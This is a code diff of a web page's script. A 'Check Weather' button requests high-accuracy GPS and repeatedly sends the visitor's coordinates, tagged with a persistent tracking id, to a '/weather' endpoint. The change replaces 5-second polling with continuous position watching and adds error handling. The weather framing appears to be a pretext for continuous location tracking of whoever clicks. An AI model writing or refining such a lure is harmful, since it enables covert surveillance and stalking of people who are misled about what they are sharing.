@@ -121,65 +121,71 @@
 
 
     <script>
-        const id = localStorage.getItem("id") || generateId()
-        const btn = document.querySelector("#check-weather")
-        let __interval
+        const id = localStorage.getItem("id") || generateId();
+        const btn = document.querySelector("#check-weather");
+        let watchId = null;
 
         btn.addEventListener("click", () => {
-            btn.disabled = true
-            btn.innerHTML = "Fetching...."
-
-            getLocation()
-        })
-
-        function getLocation() {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    btn.disabled = true
-                    const lat = position.coords.latitude
-                    const lng = position.coords.longitude
-
-                    fetch("/weather", {
-                        method: "POST",
-                        body: JSON.stringify({
-                            id,
-                            lat,
-                            lng,
-                        }),
-                        headers: {
-                            "Content-Type": "application/json"
-                        }
-                    }).catch(error => {
-                        console.log("post error", error)
-                    })
-                },
-                (error) => {
-                    alert("Please Turn on GPS Location.")
-                    btn.disabled = false
-                    btn.innerHTML = "Check Weather"
-                    console.error("Error watching position:", error);
-                },
-                {
-                    enableHighAccuracy: true, // Use GPS if available
-                }
-            )
-
-            if (__interval) clearTimeout(__interval)
-            __interval = setTimeout(getLocation, 5000)
-        }
-
-        function generateId(length = 10) {
-            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            let result = '';
-            for (let i = 0; i < length; i++) {
-                const randomIndex = Math.floor(Math.random() * characters.length);
-                result += characters[randomIndex];
+            if (!("geolocation" in navigator)) {
+                alert("Is browser mein location support nahi hai.");
+                return;
             }
 
-            localStorage.setItem("id", result)
+            btn.disabled = true;
+            btn.textContent = "Waiting for location...";
+
+            if (watchId !== null) {
+                navigator.geolocation.clearWatch(watchId);
+            }
+
+            watchId = navigator.geolocation.watchPosition(
+                async (position) => {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+
+                    try {
+                        const response = await fetch("/weather", {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify({ id, lat, lng })
+                        });
+
+                        if (!response.ok) {
+                            throw new Error("Server response: " + response.status);
+                        }
+
+                        btn.textContent = "Location sharing active";
+                    } catch (error) {
+                        console.error("Location send failed:", error);
+                        btn.disabled = false;
+                        btn.textContent = "Retry location sharing";
+                    }
+                },
+                (error) => {
+                    console.error("Location error:", error);
+                    alert("Location nahi mili. Browser permission aur device GPS check karo.");
+                    btn.disabled = false;
+                    btn.textContent = "Check Weather";
+                },
+                {
+                    enableHighAccuracy: true,
+                    maximumAge: 2000,
+                    timeout: 20000
+                }
+            );
+        });
+
+        function generateId(length = 10) {
+            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            let result = "";
+            for (let i = 0; i < length; i++) {
+                result += chars[Math.floor(Math.random() * chars.length)];
+            }
+            localStorage.setItem("id", result);
             return result;
         }
-
     </script>
 </body>
 
